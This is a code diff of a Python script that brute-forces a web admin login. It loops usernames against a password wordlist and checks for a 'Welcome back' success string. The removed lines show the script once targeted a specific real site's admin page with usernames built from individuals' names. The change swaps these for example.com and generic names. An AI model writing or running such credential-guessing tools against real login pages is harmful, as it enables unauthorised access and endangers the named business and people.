@@ -3,8 +3,8 @@
 import requests
 import sys
 
-target = "https://qhqmotors.com/admin/"
-usernames = ['admin', 'administrator', 'dabeer', 'dabeerqureshi', 'dabeerulhaq', 'qamar', 'qamarulhaq', 'naveed', 'naveedulhaq']
+target = "https://example.com/admin/"
+usernames = ['admin', 'administrator']
 passwords = "ssh-common-password.txt" 
 needle = "Welcome back"
 
@@ -23,58 +23,3 @@ for username in usernames:
         sys.stdout.write('\n')
         sys.stdout.write("\tNo password found for '{}'!".format(username))
         sys.stdout.write('\n')
-
-
-
-
-
-
-
-
- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
